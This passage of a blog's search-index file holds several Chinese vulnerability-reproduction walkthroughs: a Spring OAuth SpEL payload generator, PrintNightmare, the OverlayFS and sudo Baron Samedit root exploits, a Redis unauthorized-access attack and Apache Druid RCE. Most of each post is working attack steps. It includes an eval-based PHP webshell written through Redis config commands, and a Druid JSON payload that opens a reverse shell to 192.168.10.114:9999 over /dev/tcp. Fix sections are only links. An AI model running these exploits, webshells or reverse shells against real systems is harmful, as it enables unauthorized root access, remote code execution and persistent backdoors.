class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">message = input(&#x27;Enter message to encode:&#x27;)<br>poc = &#x27;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#x27; % ord(message[0])<br><br>for ch in message[1:]:<br>    poc += &#x27;.concat(T(java.lang.Character).toString(%s))&#x27; % ord(ch) <br><br>poc += &#x27;)&#125;&#x27;<br>print(poc)<br></code></pre></td></tr></table></figure><p>然后在将生成的值替换到 URL 中访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=粘贴到此处<br></code></pre></td></tr></table></figure><p><img src="getshell.jpg"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p><a href="https://paper.seebug.org/70/">https://paper.seebug.org/70/</a></p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://paper.seebug.org/70/">https://paper.seebug.org/70/</a></p><p><a href="https://blog.csdn.net/weixin_41598660/article/details/109577691">https://blog.csdn.net/weixin_41598660/article/details/109577691</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Spring 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-34527（本地提权）漏洞复现</title>
      <link href="/2021/07/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2021-34527%EF%BC%88%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%EF%BC%89/CVE-2021-34527%EF%BC%88%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%EF%BC%89/"/>
      <url>/2021/07/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2021-34527%EF%BC%88%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%EF%BC%89/CVE-2021-34527%EF%BC%88%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Windows 系统默认开启 Print Spooler 服务，普通用户可以利用此漏洞提升至 SYSTEM 管理权限。在域环境下，域用户可远程利用该漏洞以 SYSTEM 权限在域控制器上执行任意代码，从而获得整个域的控制权。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><ul><li>Windows Server 2012 R2 (Server Core installation)</li><li>Windows Server 2012 R2</li><li>Windows Server 2012 (Server Core installation)</li><li>Windows Server 2012</li><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li><li>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</li><li>Windows Server 2008 for x64-based Systems Service Pack 2</li><li>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)</li><li>Windows Server 2008 for 32-bit Systems Service Pack 2</li><li>Windows RT 8.1</li><li>Windows 8.1 for x64-based systems</li><li>Windows 8.1 for 32-bit systems</li><li>Windows 7 for x64-based Systems Service Pack 1</li><li>Windows 7 for 32-bit Systems Service Pack 1</li><li>Windows Server 2016 (Server Core installation)</li><li>Windows Server 2016</li><li>Windows 10 Version 1607 for x64-based Systems</li><li>Windows 10 Version 1607 for 32-bit Systems</li><li>Windows 10 for x64-based Systems</li><li>Windows 10 for 32-bit Systems</li><li>Windows Server, version 20H2 (Server Core Installation)</li><li>Windows 10 Version 20H2 for ARM64-based Systems</li><li>Windows 10 Version 20H2 for 32-bit Systems</li><li>Windows 10 Version 20H2 for x64-based Systems</li><li>Windows Server, version 2004 (Server Core installation)</li><li>Windows 10 Version 2004 for x64-based Systems</li><li>Windows 10 Version 2004 for ARM64-based Systems</li><li>Windows 10 Version 2004 for 32-bit Systems</li><li>Windows 10 Version 21H1 for 32-bit Systems</li><li>Windows 10 Version 21H1 for ARM64-based Systems</li><li>Windows 10 Version 21H1 for x64-based Systems</li><li>Windows Server, version 1909 (Server Core installation)</li><li>Windows 10 Version 1909 for ARM64-based Systems</li><li>Windows 10 Version 1909 for x64-based Systems</li><li>Windows 10 Version 1909 for 32-bit Systems</li><li>Windows Server 2019 (Server Core installation)</li><li>Windows Server 2019</li><li>Windows 10 Version 1809 for ARM64-based Systems</li><li>Windows 10 Version 1809 for x64-based Systems</li><li>Windows 10 Version 1809 for 32-bit Systems</li></ul><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p><a href="https://github.com/JohnHammond/CVE-2021-34527">poc下载</a></p><p>如提示没运行脚本的权限，则需先运行如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  开启运行脚本的权限（需管理员运行 powershell）<br>set-executionpolicy remotesigned<br></code></pre></td></tr></table></figure><p><img src="1.png"></p><p>切换到测试用户</p><p><img src="2.png"></p><p>在测试用户下的 powershell 运行如下命令：</p><p>进入 poc 所在目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cd C:\Users\qwe\Desktop\CVE-2021-34527-master<br></code></pre></td></tr></table></figure><p><img src="3.png"></p><p>新建用户 test_1 密码 123</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Import-Module .\CVE-2021-34527.ps1<br>Invoke-Nightmare -DriverName &quot;Xerox&quot; -NewUser &quot;test_1&quot; -NewPassword &quot;123&quot;<br></code></pre></td></tr></table></figure><p><img src="4.png"></p><p>新建成功后使用新建好的用户运行 powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  使用 test_1 用户运行 powershell.exe<br>runas /user:test_1 powershell.exe<br></code></pre></td></tr></table></figure><p><img src="5.png"></p><p>此时已成功提权为管理员权限</p><p><img src="6.png"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p><a href="http://blog.nsfocus.net/cve-2021-34527/">http://blog.nsfocus.net/cve-2021-34527/</a></p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://github.com/JohnHammond/CVE-2021-34527">https://github.com/JohnHammond/CVE-2021-34527</a></p>]]></content>
      
      
      <categories>
          
          <category> Windows 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内核提权 CVE-2021-3493 漏洞复现</title>
      <link href="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p><strong>OverlayFS</strong> 是一种叠合式文件系统，能够在底层文件系统上叠加另一个文件系统</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Linux 内核中 overlayfs 文件系统是 Ubuntu 的特定问题，由于没有正确的验证文件系统功能在用户名称空间中的应用，从而导致攻击者可以安装一个允许未授权挂载的 overlayfs 修补程序来提升权限</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Ubuntu 20.10</p><p>Ubuntu 20.04 LTS</p><p>Ubuntu 18.04 LTS</p><p>Ubuntu 16.04 LTS</p><p>Ubuntu 14.04 ESM</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  下载 ubuntu 20.04.1 镜像<br>http://old-releases.ubuntu.com/releases/20.04.1/ubuntu-20.04.1-desktop-amd64.iso<br><br>#  如上述链接访问失败，则访问如下链接进行下载<br>http://old-releases.ubuntu.com/releases/20.04.1/<br></code></pre></td></tr></table></figure><p>安装步骤参考：<a href="https://www.cnblogs.com/ubuntuanzhuang/p/ubuntu20_4.html">https://www.cnblogs.com/ubuntuanzhuang/p/ubuntu20_4.html</a></p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、进入系统后先尝试下载 <a href="https://github.com/ASkyeye/CVE-2021-3493.git">POC</a> ，看看是否有对当前所在的文件夹有写入的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">git clone https://github.com/ASkyeye/CVE-2021-3493.git<br></code></pre></td></tr></table></figure><p><img src="1.png"></p><p>此时可发现当用户对 “&#x2F;“ 目录没有写入权限，此时需要进入一个有写入权限的目录进行下载（普通用户有写入权限的目录常见为：&#x2F;tmp、桌面、&#x2F;home&#x2F;用户名）</p><p>2、进入一个有写入权限的目录，然后重新尝试下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cd /tmp<br>git clone https://github.com/ASkyeye/CVE-2021-3493.git<br></code></pre></td></tr></table></figure><p><img src="2.png"></p><p>3、下载完后进入目录，然后进行编译，最后再给编译完后的文件添加执行权限并运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cd CVE-2021-3493/<br>gcc exploit.c -o exploit<br>chmod +x exploit.c<br>./exploit<br></code></pre></td></tr></table></figure><p><img src="3.png"></p><p>此时可看到已获取到管理员权限（ ”#“ 号代表管理员权限）</p><p><img src="4.png"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>更新到新版本</p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/">https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/</a></p><p><a href="https://ubuntu.com/security/CVE-2021-3493">https://ubuntu.com/security/CVE-2021-3493</a></p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7c03e2cda4a584cadc398e8f6641ca9988a39d52">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7c03e2cda4a584cadc398e8f6641ca9988a39d52</a></p><p><a href="https://www.openwall.com/lists/oss-security/2021/04/16/1">https://www.openwall.com/lists/oss-security/2021/04/16/1</a></p><p><a href="https://github.com/ASkyeye/CVE-2021-3493">https://github.com/ASkyeye/CVE-2021-3493</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux sudo CVE-2021-3156 提权漏洞复现</title>
      <link href="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>sudo是<a href="https://baike.baidu.com/item/linux%E7%B3%BB%E7%BB%9F/1732935">linux系统</a>管理指令，是允许<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98/1503845">系统管理员</a>让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>1月26日，Sudo发布安全通告，修复了一个类Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 &#x2F;etc&#x2F;sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Sudo 1.8.2 - 1.8.31p2</p><p>Sudo 1.9.0 - 1.9.5p1</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  获取环境<br>sudo docker pull manishfoodtechs/xfcefulldesktop_ubuntu20.4<br>#  运行环境<br>sudo docker run -it manishfoodtechs/xfcefulldesktop_ubuntu20.4 /bin/bash<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>新建测试用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">useradd test<br>echo test:123 | chpasswd<br>su test<br></code></pre></td></tr></table></figure><p><img src="test_user.png"></p><p>查看 sudo 版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sudo --version<br></code></pre></td></tr></table></figure><p><img src="sudo_version.png"></p><p>查看系统版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">lsb_release -a<br></code></pre></td></tr></table></figure><p><img src="system_version.png"></p><p>找一个有写入权限的目录并下载运行 <a href="https://github.com/blasty/CVE-2021-3156">exp</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cd /tmp<br>git clone https://github.com/blasty/CVE-2021-3156.git<br>cd CVE-2021-3156<br>make<br>chmod +x sudo-hax-me-a-sandwich<br>./sudo-hax-me-a-sandwich 1<br></code></pre></td></tr></table></figure><p><img src="exp.png"></p><p>查看 <a href="https://github.com/blasty/CVE-2021-3156">exp</a> 可用目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./sudo-hax-me-a-sandwich<br></code></pre></td></tr></table></figure><p><img src="target.png"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>参考：<a href="http://blog.nsfocus.net/cve-2021-3156/">http://blog.nsfocus.net/cve-2021-3156/</a></p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/Rain99-/p/14354452.html">https://www.cnblogs.com/Rain99-/p/14354452.html</a></p><p><a href="https://www.cnblogs.com/yujin2020/p/14377503.html">https://www.cnblogs.com/yujin2020/p/14377503.html</a></p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/113447282">https://blog.csdn.net/xuandao_ahfengren/article/details/113447282</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Linux 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 未授权访问漏洞复现</title>
      <link href="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
      <url>/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI <a href="https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80">C语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728">数据库</a>，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由<a href="https://baike.baidu.com/item/Pivotal">Pivotal</a>赞助。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Redis默认情况下，会绑定在0.0.0.0:6379，这样会将redis服务暴露在公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问redis以及读取redis的数据，攻击者在未授权访问redis的情况下可以利用redis的相关方法，进而成功在redis服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Redis 2.x</p><p>Redis 3.x</p><p>Redis 4.x</p><p>Redis 5.x</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  安装 apache<br>sudo apt-get install apache2<br>sudo systemctl restart apache2<br>#  下载 redis 并解压<br>cd /<br>sudo wget http://download.redis.io/releases/redis-2.8.17.tar.gz<br>sudo tar xzvf redis-2.8.17.tar.gz<br>#  安装 make<br>cd /redis-2.8.17<br>sudo make<br>#  启动<br>sudo /redis-2.8.17/src/redis-server /redis-2.8.17/redis.conf<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、使用 <a href="https://github.com/MicrosoftArchive/redis/releases">redis客户端工具</a> 进行连接（此处有未授权访问能直接连接）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">redis-cli.exe -h 192.168.10.233<br></code></pre></td></tr></table></figure><p><img src="connect.png"></p><p>2、常用 redis 命令</p><p>redis 常用命令</p><p>详细命令：<a href="http://doc.redisfans.com/">http://doc.redisfans.com/</a></p><p>信息收集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">info<br></code></pre></td></tr></table></figure><p><img src="info.png"></p><p>查看连接设置的名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">client getname<br></code></pre></td></tr></table></figure><p>新建默认没有名字如下</p><p><img src="getname.png"></p><p>查看数据库中的键值对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">keys *<br></code></pre></td></tr></table></figure><p><img src="keys.png"></p><p>删除键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">del key 删除键为key的数据<br></code></pre></td></tr></table></figure><h3 id="写入-WebShell"><a href="#写入-WebShell" class="headerlink" title="写入 WebShell"></a>写入 WebShell</h3><p>需求：</p><ul><li><p>1、redis 未授权 能 redis-cli 连上</p></li><li><p>2、开了 web 并且知道路径</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">config set dir /var/www/html<br>config set dbfilename redis.php<br>set webshell &quot;&lt;?php echo @eval($_POST[&#x27;pass&#x27;]); ?&gt;&quot;<br>save<br></code></pre></td></tr></table></figure><p>使用蚁剑连接</p><p><img src="webshell-1.png"></p><p><img src="webshell-2.png"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>参考：<a href="https://www.cnblogs.com/xun0523/p/9804999.html">https://www.cnblogs.com/xun0523/p/9804999.html</a></p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/cl0ud/p/13873085.html">https://www.cnblogs.com/cl0ud/p/13873085.html</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p><p><a href="https://www.secpulse.com/archives/5357.html">https://www.secpulse.com/archives/5357.html</a></p><p><a href="https://www.cnblogs.com/-qing-/p/10978912.htm">https://www.cnblogs.com/-qing-/p/10978912.htm</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Redis 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Druid CVE-2021-25646 RCE 漏洞复现</title>
      <link href="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/"/>
      <url>/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Druid 是一个分布式的、支持实时多维 OLAP 分析的数据处理系统。它既支持高速的数据实时摄入处理，也支持实时且灵活的多维数据分析查询。因此 Druid 最常用的场景就是大数据背景下、灵活快速的多维 OLAP 分析。 另外，Druid 还有一个关键的特点：它支持根据时间戳对数据进行预聚合摄入和聚合分析，因此也有用户经常在有时序数据处理分析的场景中用到它。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。<br>Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Apache Druid &lt; 0.20.1</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  获取 druid 镜像<br>sudo docker pull fokkodriesprong/docker-druid<br>#  重启 docker<br>sudo systemctl restart docker<br>#  启动 druid 环境<br>sudo docker run -d -p 8888:8888 fokkodriesprong/docker-druid<br>#  查看环境<br>sudo docker ps<br>#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））<br>sudo docker exec -it 268f542b6482 bash<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、Win10 监听 9999 端口</p><p><img src="nc-1.png"></p><p>2、访问 <code>http://192.168.10.233:8888/unified-console.html</code> 并单击 <code>Load data</code></p><p><img src="web-1.png"></p><p>3、在 <code>Base directory</code> 跟 <code>File filter</code> 处分别填入如下内容，然后单击 <code>Next: Parse data</code> 并抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">quickstart/tutorial/<br>wikiticker-2015-09-12-sampled.json.gz<br></code></pre></td></tr></table></figure><p><img src="web-2.png"></p><p>4、使用 BP 抓包后构建poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123;&quot;ioConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;firehose&quot;:&#123;&quot;type&quot;:&quot;local&quot;,&quot;baseDir&quot;:&quot;quickstart/tutorial/&quot;,&quot;filter&quot;:&quot;wikiticker-2015-09-12-sampled.json.gz&quot;&#125;&#125;,&quot;dataSchema&quot;:&#123;&quot;dataSource&quot;:&quot;sample&quot;,&quot;parser&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;parseSpec&quot;:&#123;&quot;format&quot;:&quot;json&quot;,&quot;timestampSpec&quot;:&#123;&quot;column&quot;:&quot;time&quot;,&quot;format&quot;:&quot;iso&quot;&#125;,&quot;dimensionsSpec&quot;:&#123;&#125;&#125;&#125;,&quot;transformSpec&quot;:&#123;&quot;transforms&quot;:[],&quot;filter&quot;:&#123;&quot;type&quot;:&quot;javascript&quot;,<br> <br>&quot;function&quot;:&quot;function(value)&#123;return java.lang.Runtime.getRuntime().exec(&#x27;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/192.168.10.114/9999 0&gt;&amp;1&#x27;)&#125;&quot;,<br> <br>&quot;dimension&quot;:&quot;added&quot;,<br> <br>&quot;&quot;:&#123;<br> <br>&quot;enabled&quot;:&quot;true&quot;<br> <br>&#125;<br> 